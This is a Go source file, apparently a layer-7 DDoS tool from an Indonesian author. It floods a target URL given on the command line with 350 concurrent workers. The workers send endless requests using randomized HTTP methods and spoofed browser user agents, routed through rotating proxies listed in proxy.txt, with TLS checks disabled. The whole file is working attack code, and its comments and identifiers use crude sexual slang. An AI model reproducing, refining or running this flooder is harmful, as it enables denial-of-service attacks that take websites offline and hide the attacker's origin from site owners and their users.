// * DIZ FLYZE DEVELOPER
// * Made In Jawa Hama
package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

// Mboh lali
const (
	TendangJin = 350           // Seting ke 250 buat ngocok vps
	JandaAnak  = 3 * time.Second // Biarin
)

// > All ngentod
var ngentod = []string{
	"GET",
	"ACL",
	"CHECKOUT",
	"HEAD",
	"POST",
	"PUT",
	"DELETE",
	"PATCH",
	"OPTIONS",
	"COPY",
	"MOVE",
	"MKCOL",
	"PROPFIND",
	"LOCK",
	"UNLOCK",
	"TRACE",
	"CONNECT",
	"PURGE",
	"REPORT",
	"SEARCH",
}

// > Gausah Di Apa²in
var GuaGanteng = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; 2211133G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
}

// > Biarin ae ini
var BeHa = http.Header{
	"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"},
	"Accept-Language":           {"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},
	"Accept-Encoding":           {"gzip, deflate, br"},
	"Connection":                {"keep-alive"},
	"Upgrade-Insecure-Requests": {"1"},
	"Sec-Fetch-Dest":            {"document"},
	"Sec-Fetch-Mode":            {"navigate"},
	"Sec-Fetch-Site":            {"none"},
	"Sec-Fetch-User":            {"?1"},
}

// Ah ah crot
type Meki struct {
	rng *rand.Rand
	mu  sync.Mutex
}

func (wr *Meki) Intn(n int) int {
	wr.mu.Lock()
	defer wr.mu.Unlock()
	return wr.rng.Intn(n)
}

// > Biarin ae udah maksimal ini
func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())
}

// ========== PERUBAHAN MULAI DI SINI ==========
// 1. Buat slice global untuk menyimpan semua HTTP client (masing2 punya proxy sendiri)
var proxyClients []*http.Client

// 2. Fungsi untuk membuat transport dengan proxy
func BuatTransportDenganProxy(proxyAddr string) *http.Transport {
	proxyURL, _ := url.Parse(proxyAddr) // contoh: http://164.90.185.232:1081
	return &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,
		}).DialContext,
		DisableKeepAlives:      false,
		MaxIdleConns:           10000,
		MaxIdleConnsPerHost:    7000,
		MaxConnsPerHost:        0,
		IdleConnTimeout:        3 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
		},
		ForceAttemptHTTP2:     true,
		DisableCompression:    false,
		TLSHandshakeTimeout:   1 * time.Second,
		ResponseHeaderTimeout: 1 * time.Second,
		Proxy:                 http.ProxyURL(proxyURL),
	}
}

// 3. Struct worker disederhanakan (tidak perlu Colmek & Coli_enak lagi)
type Crot_Dalam struct {
	id     int
	Tempek string
	rand   *Meki
}

func (w *Crot_Dalam) BikinAnak() *http.Request {
	m := ngentod[w.rand.Intn(len(ngentod))]
	ua := GuaGanteng[w.rand.Intn(len(GuaGanteng))]
	req, _ := http.NewRequest(m, w.Tempek, nil)
	req.Header = BeHa.Clone()
	req.Header.Set("User-Agent", ua)
	return req
}

func (w *Crot_Dalam) run(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Pilih proxy client secara acak dari pool global
			client := proxyClients[w.rand.Intn(len(proxyClients))]
			req := w.BikinAnak()
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
			}
		}
	}
}

// ========== FUNGSI MAIN YANG SUDAH DIUPDATE ==========
func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Contoh : %s <url>\n", os.Args[0])
		os.Exit(1)
	}
	Tempek := os.Args[1]

	// ---------- BACA PROXY DARI FILE proxy.txt ----------
	proxyFile, err := os.Open("proxy.txt")
	if err != nil {
		fmt.Println("Gagal buka proxy.txt:", err)
		fmt.Println("Pastikan file proxy.txt ada di folder yang sama.")
		os.Exit(1)
	}
	defer proxyFile.Close()

	var proxyList []string
	scanner := bufio.NewScanner(proxyFile)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			// Format asli: IP:PORT , kita tambahin http:// di depan
			proxyList = append(proxyList, "http://"+line)
		}
	}
	if len(proxyList) == 0 {
		fmt.Println("proxy.txt kosong, tidak ada proxy.")
		os.Exit(1)
	}
	fmt.Printf("+ Loaded %d proxies\n", len(proxyList))

	// ---------- BUAT HTTP CLIENT UNTUK SETIAP PROXY ----------
	for _, proxyAddr := range proxyList {
		transport := BuatTransportDenganProxy(proxyAddr)
		client := &http.Client{
			Transport: transport,
			Timeout:   JandaAnak,
		}
		proxyClients = append(proxyClients, client)
	}

	// ---------- TAMPILAN BANNER (SAMA SEPERTI ASLI) ----------
	fmt.Printf("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠃⠀⠀⠀⠀⠀⠀Runing : Termux\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀Server : None\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠻⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀Version : v1.3.0\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⢛⣿⣿⣶⣄⠙⠿⠀⠀⠀⠀⠀⠀⠀⠀Connection : Wifi\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢀⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀Dns : dns.adguard.com\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⢀⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀Requests By : Golang\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⣼⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀Sumber : go.sum\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Modifikasi : go.mod\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Country : Indonesia\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Device : Redmi-Xiaomi\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Cpu : 8 Core\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Ram : 8+8 gb\n")
	fmt.Printf("⠀⠀⠀⠀⣠⣶⡿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Rom : 256 gb\n")
	fmt.Printf("\n🚀 All Method Sending\n")
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("+ Threads : %d\n", TendangJin)
	fmt.Printf("+ Target  : %s\n", Tempek)
	fmt.Printf("+ Mode    : Kabeh Method\n")
	fmt.Printf("+ Ulimit  : 32768\n")
	fmt.Printf("+ Layers  : Sepen/Pitu/7\n")
	fmt.Printf("+ Proxy   : %d \n", len(proxyList))
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	// ---------- START WORKER (GOROUTINE) ----------
	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	for i := 0; i < TendangJin; i++ {
		seed := time.Now().UnixNano() + int64(i)
		src := rand.NewSource(seed)
		meki := &Meki{rng: rand.New(src)}
		w := &Crot_Dalam{
			id:     i,
			Tempek: Tempek,
			rand:   meki,
		}
		wg.Add(1)
		go w.run(ctx, &wg)
	}

	// Tunggu sinyal Ctrl+C
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	fmt.Println("\n[!] Stopping...")
	cancel()
	wg.Wait()
	fmt.Println("[✓] Done.")
}
